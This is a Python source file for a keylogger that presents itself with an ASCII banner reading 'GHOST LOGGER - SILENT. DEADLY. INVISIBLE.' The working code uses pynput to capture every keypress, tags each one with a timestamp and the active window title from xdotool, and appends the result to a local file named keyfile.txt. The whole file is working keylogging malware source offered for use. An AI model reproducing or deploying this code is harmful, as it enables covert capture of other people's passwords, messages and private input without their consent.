from pynput import keyboard
from datetime import datetime
import os 

from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)


def show_banner():
    banner = r"""
   .-')   .-') _     ('-.   ('-.              .-') _    ('-. .-.                                             ('-.  _  .-')       _ (`-.                             
 ( OO ).(  OO) )  _(  OO) ( OO ).-.         (  OO) )  ( OO )  /                                           _(  OO)( \( -O )     ( (OO  )                            
(_)---\_)     '._(,------./ . --. /,--.     /     '._ ,--. ,--.,--.     .-'),-----.  ,----.     ,----.   (,------.,------.    _.`     \ ,--.   ,--.                
/    _ ||'--...__)|  .---'| \-.  \ |  |.-') |'--...__)|  | |  ||  |.-')( OO'  .-.  ''  .-./-') '  .-./-') |  .---'|   /`. '  (__...--''  \  `.'  /                 
\  :` `.'--.  .--'|  |  .-'-'  |  ||  | OO )'--.  .--'|   .|  ||  | OO )   |  | |  ||  |_( O- )|  |_( O- )|  |    |  /  | |   |  /  | |.-')     /                  
 '..`''.)  |  |  (|  '--.\| |_.'  ||  |`-' |   |  |   |       ||  |`-' \_) |  |\|  ||  | .--, \|  | .--, (|  '--. |  |_.' |   |  |_.' (OO  \   /                   
.-._)   \  |  |   |  .--' |  .-.  (|  '---.'   |  |   |  .-.  (|  '---.' \ |  | |  (|  | '. (_(|  | '. (_/|  .--' |  .  '.'   |  .___.'|   /  /\_                  
\       /  |  |   |  `---.|  | |  ||      |    |  |   |  | |  ||      |   `'  '-'  '|  '--'  | |  '--'  | |  `---.|  |\  \ .-.|  |     `-./  /.__)                 
 `-----'  _`-.-') `--('-.'`-('-.--'`-.-')-_    `('-.  _-.-')-_'`------.-. .-')----'  `------'   `------'  ('-.-.-.`--' '--'`-'`-.-')   .-')-_                      
         ( \( -O ) _(  OO) ( OO ).-.(  OO) )  _(  OO)( (  OO) )       \  ( OO )                          ( OO )  /             ( OO ).(  OO) )                     
   .-----.,------.(,------./ . --. //     '._(,------.\     .'_        ;-----.\  ,--.   ,--.-.  ,----.   ,--. ,--..-'),-----. (_)---\_)     '._                    
  '  .--./|   /`. '|  .---'| \-.  \ |'--...__)|  .---',`'--..._)       | .-.  |   \  `.'  /`-' '  .-./-')|  | |  ( OO'  .-.  '/    _ ||'--...__)                   
  |  |('-.|  /  | ||  |  .-'-'  |  |'--.  .--'|  |    |  |  \  '       | '-' /_).-')     /     |  |_( O- )   .|  /   |  | |  |\  :` `.'--.  .--'                   
 /_) |OO  )  |_.' (|  '--.\| |_.'  |   |  |  (|  '--. |  |   ' |       | .-. `.(OO  \   /  .-. |  | .--, \       \_) |  |\|  | '..`''.)  |  |                      
 ||  |`-'||  .  '.'|  .--' |  .-.  |   |  |   |  .--' |  |   / :       | |  \  ||   /  /\_ `-'(|  | '. (_/  .-.  | \ |  | |  |.-._)   \  |  |                      
(_'  '--'\|  |\  \ |  `---.|  | |  |   |  |   |  `---.|  '--'  /       | '--'  /`-./  /.__)    |  '--'  ||  | |  |  `'  '-'  '\       /  |  |                      
   `-----'`--' '--'`------'`--' `--'   `--'   `------'`-------'        `------'   `--'          `------' `--' `--'    `-----'  `-----'   `--'                        
                         [ GHOST LOGGER - SILENT. DEADLY. INVISIBLE. ]
    """
    print(Fore.GREEN + Style.BRIGHT + banner)
    print(Fore.RED + "GHOST " + Fore.CYAN + "LOGGER" + Fore.WHITE + " - SILENT. DEADLY. INVISIBLE.\n")


def get_active_window():
    try:
        # Linux example with xdotool; replace with Windows version if needed
        return os.popen('xdotool getactivewindow getwindowname').read().strip()
    except:
        return "Unknown Window"

def keypressed(key):
    time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    active_window = get_active_window()

    try:
        char = key.char
        log_line = f"[{time_stamp}] [{active_window}] {char}\n"
    except AttributeError:
        log_line = f"[{time_stamp}] [{active_window}] [{key}]\n"

    with open("keyfile.txt", "a") as logkey:
        logkey.write(log_line)

if __name__ == "__main__": 
    show_banner()
    with keyboard.Listener(on_press=keypressed) as listener:
        listener.join()
